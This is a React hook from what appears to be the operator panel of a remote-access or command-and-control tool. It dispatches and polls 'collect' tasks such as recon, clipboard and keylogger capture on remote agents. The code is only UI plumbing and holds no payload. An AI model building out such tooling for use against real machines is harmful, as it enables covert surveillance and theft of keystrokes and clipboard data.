import { useCallback, useEffect, useRef, useState } from "react";
import { toast } from "sonner";
import { api } from "@/lib/api";
import { useErrorToast } from "@/lib/hooks/useErrorToast";
import { useMutation } from "@/lib/hooks/useMutation";
import { collectTaskResult } from "./task-collect";

interface CollectOptions {
  body?: Record<string, string>;
  timeoutMs?: number;
  /** Fallback text when the task completes with empty output. */
  emptyText?: string;
  /** Success toast; omitted = silent. */
  successText?: string;
  /** Fallback i18n key for failures with no locale-aware or backend message. */
  errorKey?: string;
  /** Store the output in `result` (default true). Set false for control
   * actions (start/stop) whose ack text must not replace the last dump. */
  storeResult?: boolean;
}

interface FireOptions {
  body?: Record<string, string>;
  /** Success toast; omitted = silent. */
  successText?: string;
  /** Fallback i18n key for failures with no locale-aware or backend message. */
  errorKey?: string;
}

/**
 * Shared dispatch state for the agent detail "collect" sections
 * (Recon / Clipboard / Keylogger / Registry / …).
 *
 * - `collect(key, path, opts)`: POST → poll → GET task, stores the result.
 * - `fire(key, path, opts)`: fire-and-forget POST for trigger-style endpoints
 *   that ack without a usable task result.
 * - `key` identifies the in-flight action so callers can show per-button
 *   spinners while `busy !== null` disables the rest. `busyRef` drops
 *   concurrent calls (`mutate` supersedes callbacks but does not drop them).
 *
 * Failures route through `useErrorToast`: a mapped status (401/403/429/5xx,
 * network, timeout) localizes, a 4xx backend message surfaces, and `errorKey`
 * is the last-resort fallback. An agent switch abandons the in-flight
 * completion — its toast, its result and its busy identity belong to the
 * previous agent — and a stale call resolves `null`/`false` for its caller.
 */
export function useCollectTask(agentId: string) {
  const { toastError } = useErrorToast();
  const [busy, setBusy] = useState<string | null>(null);
  const [result, setResult] = useState<string | null>(null);
  const busyRef = useRef<string | null>(null);
  // Latest agent id: a completion that lands after a switch must not reach
  // its caller (the stored output belongs to the previous agent).
  const agentRef = useRef(agentId);
  agentRef.current = agentId;

  const { mutate: runCollect, reset: resetCollect } = useMutation({
    fn: async (path: string, opts: CollectOptions) => {
      const out = await collectTaskResult(agentId, path, opts.body, opts.timeoutMs);
      return out || opts.emptyText || "";
    },
    onSuccess: (value, _path, opts) => {
      if (opts.storeResult !== false) setResult(value);
      if (opts.successText) toast.success(opts.successText);
    },
    onError: (e, _path, opts) => toastError(e, opts.errorKey),
    // Only the latest generation reaches here, so an abandoned completion
    // (agent switch) cannot clear the new agent's busy identity.
    onSettled: () => {
      busyRef.current = null;
      setBusy(null);
    },
  });

  const { mutate: runFire, reset: resetFire } = useMutation({
    fn: async (path: string, opts: FireOptions) => {
      await api.post(path, opts.body ?? {});
      return true;
    },
    onSuccess: (_ok, _path, opts) => {
      if (opts.successText) toast.success(opts.successText);
    },
    onError: (e, _path, opts) => toastError(e, opts.errorKey),
    onSettled: () => {
      busyRef.current = null;
      setBusy(null);
    },
  });

  // Abandon an in-flight completion when the agent changes: an old toast or
  // stored dump must not land on the new agent, and the busy guard must not
  // keep blocking the new agent's sections.
  useEffect(() => {
    busyRef.current = null;
    setBusy(null);
    setResult(null);
    resetCollect();
    resetFire();
  }, [agentId, resetCollect, resetFire]);

  const collect = useCallback(
    async (key: string, path: string, opts: CollectOptions = {}): Promise<string | null> => {
      if (!agentId || busyRef.current) return null;
      busyRef.current = key;
      setBusy(key);
      const out = await runCollect(path, opts);
      if (agentRef.current !== agentId) return null;
      return out === undefined ? null : out;
    },
    [agentId, runCollect],
  );

  const fire = useCallback(
    async (key: string, path: string, opts: FireOptions = {}): Promise<boolean> => {
      if (!agentId || busyRef.current) return false;
      busyRef.current = key;
      setBusy(key);
      const ok = await runFire(path, opts);
      if (agentRef.current !== agentId) return false;
      return ok === true;
    },
    [agentId, runFire],
  );

  const reset = useCallback(() => setResult(null), []);

  return { busy, result, setResult, reset, collect, fire };
}
